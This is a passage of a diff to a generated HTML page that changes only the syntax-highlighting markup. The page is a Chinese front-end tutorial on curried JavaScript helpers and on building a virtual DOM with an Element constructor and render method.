-<span style="color:#000;font-weight:bold">var</span> censored <span style="color:#000;font-weight:bold">=</span> noVowels(<span style="color:#d14">&#34;*&#34;</span>);
-<span style="color:#998;font-style:italic">// function(x) { return x.replace(/[aeiou]/ig, &#34;*&#34;) }
-</span><span style="color:#998;font-style:italic"></span>
-censored(<span style="color:#d14">&#34;Chocolate Rain&#34;</span>);
-<span style="color:#998;font-style:italic">// &#39;Ch*c*l*t* R**n&#39;
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="nx">match</span><span class="p">(</span><span class="sr">/\s+/g</span><span class="p">,</span> <span class="s2">&#34;hello world&#34;</span><span class="p">);</span>
+<span class="c1">// [ &#39; &#39; ]
+</span><span class="c1"></span>
+<span class="nx">match</span><span class="p">(</span><span class="sr">/\s+/g</span><span class="p">)(</span><span class="s2">&#34;hello world&#34;</span><span class="p">);</span>
+<span class="c1">// [ &#39; &#39; ]
+</span><span class="c1"></span>
+<span class="kd">var</span> <span class="nx">hasSpaces</span> <span class="o">=</span> <span class="nx">match</span><span class="p">(</span><span class="sr">/\s+/g</span><span class="p">);</span>
+<span class="c1">// function(x) { return x.match(/\s+/g) }
+</span><span class="c1"></span>
+<span class="nx">hasSpaces</span><span class="p">(</span><span class="s2">&#34;hello world&#34;</span><span class="p">);</span>
+<span class="c1">// [ &#39; &#39; ]
+</span><span class="c1"></span>
+<span class="nx">hasSpaces</span><span class="p">(</span><span class="s2">&#34;spaceless&#34;</span><span class="p">);</span>
+<span class="c1">// null
+</span><span class="c1"></span>
+<span class="nx">filter</span><span class="p">(</span><span class="nx">hasSpaces</span><span class="p">,</span> <span class="p">[</span><span class="s2">&#34;tori_spelling&#34;</span><span class="p">,</span> <span class="s2">&#34;tori amos&#34;</span><span class="p">]);</span>
+<span class="c1">// [&#34;tori amos&#34;]
+</span><span class="c1"></span>
+<span class="kd">var</span> <span class="nx">findSpaces</span> <span class="o">=</span> <span class="nx">filter</span><span class="p">(</span><span class="nx">hasSpaces</span><span class="p">);</span>
+<span class="c1">// function(xs) { return xs.filter(function(x) { return x.match(/\s+/g) }) }
+</span><span class="c1"></span>
+<span class="nx">findSpaces</span><span class="p">([</span><span class="s2">&#34;tori_spelling&#34;</span><span class="p">,</span> <span class="s2">&#34;tori amos&#34;</span><span class="p">]);</span>
+<span class="c1">// [&#34;tori amos&#34;]
+</span><span class="c1"></span>
+<span class="kd">var</span> <span class="nx">noVowels</span> <span class="o">=</span> <span class="nx">replace</span><span class="p">(</span><span class="sr">/[aeiou]/ig</span><span class="p">);</span>
+<span class="c1">// function(replacement, x) { return x.replace(/[aeiou]/ig, replacement) }
+</span><span class="c1"></span>
+<span class="kd">var</span> <span class="nx">censored</span> <span class="o">=</span> <span class="nx">noVowels</span><span class="p">(</span><span class="s2">&#34;*&#34;</span><span class="p">);</span>
+<span class="c1">// function(x) { return x.replace(/[aeiou]/ig, &#34;*&#34;) }
+</span><span class="c1"></span>
+<span class="nx">censored</span><span class="p">(</span><span class="s2">&#34;Chocolate Rain&#34;</span><span class="p">);</span>
+<span class="c1">// &#39;Ch*c*l*t* R**n&#39;
 </span></code></pre></td></tr></table>
 </div>
 </div><p>这里表明的是一种“预加载”函数的能力，通过传递一到两个参数调用函数，就能得到一个记住了这些参数的新函数。</p>
@@ -1347,16 +1479,16 @@ censored(<span style="color:#d14">&#34;Chocolate Rain&#34;</span>);
 <p>假如现在你需要写一个像下面一样的表格的应用程序，这个表格可以根据不同的字段进行升序或者降序的展示。</p>
 <p><img src="https://pic3.zhimg.com/50/0c1ee6d9a303d5a43b0fa4b3fc82f3a2_hd.png" alt="image"></p>
 <p>这个应用程序看起来很简单，你可以想出好几种不同的方式来写。最容易想到的可能是，在你的 JavaScript 代码里面存储这样的数据：</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#000;font-weight:bold">var</span> sortKey <span style="color:#000;font-weight:bold">=</span> <span style="color:#d14">&#34;new&#34;</span> <span style="color:#998;font-style:italic">// 排序的字段，新增（new）、取消（cancel）、净关注（gain）、累积（cumulate）人数
-</span><span style="color:#998;font-style:italic"></span><span style="color:#000;font-weight:bold">var</span> sortType <span style="color:#000;font-weight:bold">=</span> <span style="color:#099">1</span> <span style="color:#998;font-style:italic">// 升序还是逆序
-</span><span style="color:#998;font-style:italic"></span><span style="color:#000;font-weight:bold">var</span> data <span style="color:#000;font-weight:bold">=</span> [{...}, {...}, {..}, ..] <span style="color:#998;font-style:italic">// 表格数据
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">sortKey</span> <span class="o">=</span> <span class="s2">&#34;new&#34;</span> <span class="c1">// 排序的字段，新增（new）、取消（cancel）、净关注（gain）、累积（cumulate）人数
+</span><span class="c1"></span><span class="kd">var</span> <span class="nx">sortType</span> <span class="o">=</span> <span class="mi">1</span> <span class="c1">// 升序还是逆序
+</span><span class="c1"></span><span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="p">[{...},</span> <span class="p">{...},</span> <span class="p">{..},</span> <span class="p">..]</span> <span class="c1">// 表格数据
 </span></code></pre></td></tr></table>
 </div>
 </div><p>用三个字段分别存储当前排序的字段、排序方向、还有表格数据；然后给表格头部加点击事件：当用户点击特定的字段的时候，根据上面几个字段存储的内容来对内容进行排序，然后用 JS 或者 jQuery 操作 DOM，更新页面的排序状态（表头的那几个箭头表示当前排序状态，也需要更新）和表格内容。</p>
@@ -1371,51 +1503,51 @@ censored(<span style="color:#d14">&#34;Chocolate Rain&#34;</span>);
 <p><img src="https://pic4.zhimg.com/50/d5cda33e28d83ba12368202645f9e35b_hd.png" alt="image"></p>
 <p>而这仅仅是第一层。真正的 DOM 元素非常庞大，这是因为标准就是这么设计的。而且操作它们的时候你要小心翼翼，轻微的触碰可能就会导致页面重排，这可是杀死性能的罪魁祸首。</p>
 <p>相对于 DOM 对象，原生的 JavaScript 对象处理起来更快，而且更简单。DOM 树上的结构、属性信息我们都可以很容易地用 JavaScript 对象表示出来：</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#000;font-weight:bold">var</span> element <span style="color:#000;font-weight:bold">=</span> {
-  tagName<span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;ul&#39;</span>, <span style="color:#998;font-style:italic">// 节点标签名
-</span><span style="color:#998;font-style:italic"></span>  props<span style="color:#000;font-weight:bold">:</span> { <span style="color:#998;font-style:italic">// DOM的属性，用一个对象存储键值对
-</span><span style="color:#998;font-style:italic"></span>    id<span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;list&#39;</span>
-  },
-  children<span style="color:#000;font-weight:bold">:</span> [ <span style="color:#998;font-style:italic">// 该节点的子节点
-</span><span style="color:#998;font-style:italic"></span>    {tagName<span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;li&#39;</span>, props<span style="color:#000;font-weight:bold">:</span> {<span style="color:#000;font-weight:bold">class</span><span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;item&#39;</span>}, children<span style="color:#000;font-weight:bold">:</span> [<span style="color:#d14">&#34;Item 1&#34;</span>]},
-    {tagName<span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;li&#39;</span>, props<span style="color:#000;font-weight:bold">:</span> {<span style="color:#000;font-weight:bold">class</span><span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;item&#39;</span>}, children<span style="color:#000;font-weight:bold">:</span> [<span style="color:#d14">&#34;Item 2&#34;</span>]},
-    {tagName<span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;li&#39;</span>, props<span style="color:#000;font-weight:bold">:</span> {<span style="color:#000;font-weight:bold">class</span><span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;item&#39;</span>}, children<span style="color:#000;font-weight:bold">:</span> [<span style="color:#d14">&#34;Item 3&#34;</span>]},
-  ]
-}
+<td class="lntd">
+<pre class="chroma"><code class="language-javascript" data-lang="javascript"><span class="kd">var</span> <span class="nx">element</span> <span class="o">=</span> <span class="p">{</span>
+  <span class="nx">tagName</span><span class="o">:</span> <span class="s1">&#39;ul&#39;</span><span class="p">,</span> <span class="c1">// 节点标签名
+</span><span class="c1"></span>  <span class="nx">props</span><span class="o">:</span> <span class="p">{</span> <span class="c1">// DOM的属性，用一个对象存储键值对
+</span><span class="c1"></span>    <span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;list&#39;</span>
+  <span class="p">},</span>
+  <span class="nx">children</span><span class="o">:</span> <span class="p">[</span> <span class="c1">// 该节点的子节点
+</span><span class="c1"></span>    <span class="p">{</span><span class="nx">tagName</span><span class="o">:</span> <span class="s1">&#39;li&#39;</span><span class="p">,</span> <span class="nx">props</span><span class="o">:</span> <span class="p">{</span><span class="kr">class</span><span class="o">:</span> <span class="s1">&#39;item&#39;</span><span class="p">},</span> <span class="nx">children</span><span class="o">:</span> <span class="p">[</span><span class="s2">&#34;Item 1&#34;</span><span class="p">]},</span>
+    <span class="p">{</span><span class="nx">tagName</span><span class="o">:</span> <span class="s1">&#39;li&#39;</span><span class="p">,</span> <span class="nx">props</span><span class="o">:</span> <span class="p">{</span><span class="kr">class</span><span class="o">:</span> <span class="s1">&#39;item&#39;</span><span class="p">},</span> <span class="nx">children</span><span class="o">:</span> <span class="p">[</span><span class="s2">&#34;Item 2&#34;</span><span class="p">]},</span>
+    <span class="p">{</span><span class="nx">tagName</span><span class="o">:</span> <span class="s1">&#39;li&#39;</span><span class="p">,</span> <span class="nx">props</span><span class="o">:</span> <span class="p">{</span><span class="kr">class</span><span class="o">:</span> <span class="s1">&#39;item&#39;</span><span class="p">},</span> <span class="nx">children</span><span class="o">:</span> <span class="p">[</span><span class="s2">&#34;Item 3&#34;</span><span class="p">]},</span>
+  <span class="p">]</span>
+<span class="p">}</span>
 
 </code></pre></td></tr></table>
 </div>
 </div><p>上面对应的HTML写法是：</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#000080">ul</span> <span style="color:#008080">id</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#39;list&#39;</span>&gt;
-  &lt;<span style="color:#000080">li</span> <span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#39;item&#39;</span>&gt;Item 1&lt;/<span style="color:#000080">li</span>&gt;
-  &lt;<span style="color:#000080">li</span> <span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#39;item&#39;</span>&gt;Item 2&lt;/<span style="color:#000080">li</span>&gt;
-  &lt;<span style="color:#000080">li</span> <span style="color:#008080">class</span><span style="color:#000;font-weight:bold">=</span><span style="color:#d14">&#39;item&#39;</span>&gt;Item 3&lt;/<span style="color:#000080">li</span>&gt;
-&lt;/<span style="color:#000080">ul</span>&gt;
+<td class="lntd">
+<pre class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">ul</span> <span class="na">id</span><span class="o">=</span><span class="s">&#39;list&#39;</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">li</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;item&#39;</span><span class="p">&gt;</span>Item 1<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">li</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;item&#39;</span><span class="p">&gt;</span>Item 2<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">li</span> <span class="na">class</span><span class="o">=</span><span class="s">&#39;item&#39;</span><span class="p">&gt;</span>Item 3<span class="p">&lt;/</span><span class="nt">li</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">ul</span><span class="p">&gt;</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>既然原来 DOM 树的信息都可以用 JavaScript 对象来表示，反过来，你就可以根据这个用 JavaScript 对象表示的树结构来构建一棵真正的DOM树。</p>
@@ -1432,128 +1564,128 @@ censored(<span style="color:#d14">&#34;Chocolate Rain&#34;</span>);
 <h4 id="31-步骤一用js对象模拟dom树">3.1 步骤一：用JS对象模拟DOM树</h4>
 <p>用 JavaScript 来表示一个 DOM 节点是很简单的事情，你只需要记录它的节点类型、属性，还有子节点：</p>
 <p>element.js</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">function</span> Element (tagName, props, children) {
-  <span style="color:#000;font-weight:bold">this</span>.tagName <span style="color:#000;font-weight:bold">=</span> tagName
-  <span style="color:#000;font-weight:bold">this</span>.props <span style="color:#000;font-weight:bold">=</span> props
-  <span style="color:#000;font-weight:bold">this</span>.children <span style="color:#000;font-weight:bold">=</span> children
-}
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">function</span> <span class="nx">Element</span> <span class="p">(</span><span class="nx">tagName</span><span class="p">,</span> <span class="nx">props</span><span class="p">,</span> <span class="nx">children</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">this</span><span class="p">.</span><span class="nx">tagName</span> <span class="o">=</span> <span class="nx">tagName</span>
+  <span class="k">this</span><span class="p">.</span><span class="nx">props</span> <span class="o">=</span> <span class="nx">props</span>
+  <span class="k">this</span><span class="p">.</span><span class="nx">children</span> <span class="o">=</span> <span class="nx">children</span>
+<span class="p">}</span>
 
-module.exports <span style="color:#000;font-weight:bold">=</span> <span style="color:#000;font-weight:bold">function</span> (tagName, props, children) {
-  <span style="color:#000;font-weight:bold">return</span> <span style="color:#000;font-weight:bold">new</span> Element(tagName, props, children)
-}
+<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">tagName</span><span class="p">,</span> <span class="nx">props</span><span class="p">,</span> <span class="nx">children</span><span class="p">)</span> <span class="p">{</span>
+  <span class="k">return</span> <span class="k">new</span> <span class="nx">Element</span><span class="p">(</span><span class="nx">tagName</span><span class="p">,</span> <span class="nx">props</span><span class="p">,</span> <span class="nx">children</span><span class="p">)</span>
+<span class="p">}</span>
 
 </code></pre></td></tr></table>
 </div>
 </div><p>例如上面的 DOM 结构就可以简单的表示：</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#000;font-weight:bold">var</span> el <span style="color:#000;font-weight:bold">=</span> require(<span style="color:#d14">&#39;./element&#39;</span>)
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js"><span class="kd">var</span> <span class="nx">el</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./element&#39;</span><span class="p">)</span>
 
-<span style="color:#000;font-weight:bold">var</span> ul <span style="color:#000;font-weight:bold">=</span> el(<span style="color:#d14">&#39;ul&#39;</span>, {id<span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;list&#39;</span>}, [
-  el(<span style="color:#d14">&#39;li&#39;</span>, {<span style="color:#000;font-weight:bold">class</span><span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;item&#39;</span>}, [<span style="color:#d14">&#39;Item 1&#39;</span>]),
-  el(<span style="color:#d14">&#39;li&#39;</span>, {<span style="color:#000;font-weight:bold">class</span><span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;item&#39;</span>}, [<span style="color:#d14">&#39;Item 2&#39;</span>]),
-  el(<span style="color:#d14">&#39;li&#39;</span>, {<span style="color:#000;font-weight:bold">class</span><span style="color:#000;font-weight:bold">:</span> <span style="color:#d14">&#39;item&#39;</span>}, [<span style="color:#d14">&#39;Item 3&#39;</span>])
-])
+<span class="kd">var</span> <span class="nx">ul</span> <span class="o">=</span> <span class="nx">el</span><span class="p">(</span><span class="s1">&#39;ul&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">id</span><span class="o">:</span> <span class="s1">&#39;list&#39;</span><span class="p">},</span> <span class="p">[</span>
+  <span class="nx">el</span><span class="p">(</span><span class="s1">&#39;li&#39;</span><span class="p">,</span> <span class="p">{</span><span class="kr">class</span><span class="o">:</span> <span class="s1">&#39;item&#39;</span><span class="p">},</span> <span class="p">[</span><span class="s1">&#39;Item 1&#39;</span><span class="p">]),</span>
+  <span class="nx">el</span><span class="p">(</span><span class="s1">&#39;li&#39;</span><span class="p">,</span> <span class="p">{</span><span class="kr">class</span><span class="o">:</span> <span class="s1">&#39;item&#39;</span><span class="p">},</span> <span class="p">[</span><span class="s1">&#39;Item 2&#39;</span><span class="p">]),</span>
+  <span class="nx">el</span><span class="p">(</span><span class="s1">&#39;li&#39;</span><span class="p">,</span> <span class="p">{</span><span class="kr">class</span><span class="o">:</span> <span class="s1">&#39;item&#39;</span><span class="p">},</span> <span class="p">[</span><span class="s1">&#39;Item 3&#39;</span><span class="p">])</span>
+<span class="p">])</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>现在ul只是一个 JavaScript 对象表示的 DOM 结构，页面上并没有这个结构。我们可以根据这个ul构建真正的:</p>
-<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
-<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
-</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
 </span></code></pre></td>
-<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
-<pre style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">
-Element.prototype.render <span style="color:#000;font-weight:bold">=</span> <span style="color:#000;font-weight:bold">function</span> () {
-  <span style="color:#000;font-weight:bold">var</span> el <span style="color:#000;font-weight:bold">=</span> <span style="color:#0086b3">document</span>.createElement(<span style="color:#000;font-weight:bold">this</span>.tagName) <span style="color:#998;font-style:italic">// 根据tagName构建
-</span><span style="color:#998;font-style:italic"></span>  <span style="color:#000;font-weight:bold">var</span> props <span style="color:#000;font-weight:bold">=</span> <span style="color:#000;font-weight:bold">this</span>.props
+<td class="lntd">
+<pre class="chroma"><code class="language-js" data-lang="js">
+<span class="nx">Element</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">render</span> <span class="o">=</span> <span class="kd">function</span> <span class="p">()</span> <span class="p">{</span>
+  <span class="kd">var</span> <span class="nx">el</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">tagName</span><span class="p">)</span> <span class="c1">// 根据tagName构建
+</span><span class="c1"></span>  <span class="kd">var</span> <span class="nx">props</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">props</span>
 
-  <span style="color:#000;font-weight:bold">for</span> (<span style="color:#000;font-weight:bold">var</span> propName <span style="color:#000;font-weight:bold">in</span> props) { <span style="color:#998;font-style:italic">// 设置节点的DOM属性
-</span><span style="color:#998;font-style:italic"></span>    <span style="color:#000;font-weight:bold">var</span> propValue <span style="color:#000;font-weight:bold">=</span> props[propName]
-    el.setAttribute(propName, propValue)
-  }
+  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">propName</span> <span class="k">in</span> <span class="nx">props</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// 设置节点的DOM属性
+</span><span class="c1"></span>    <span class="kd">var</span> <span class="nx">propValue</span> <span class="o">=</span> <span class="nx">props</span><span class="p">[</span><span class="nx">propName</span><span class="p">]</span>
+    <span class="nx">el</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="nx">propName</span><span class="p">,</span> <span class="nx">propValue</span><span class="p">)</span>
+  <span class="p">}</span>
 
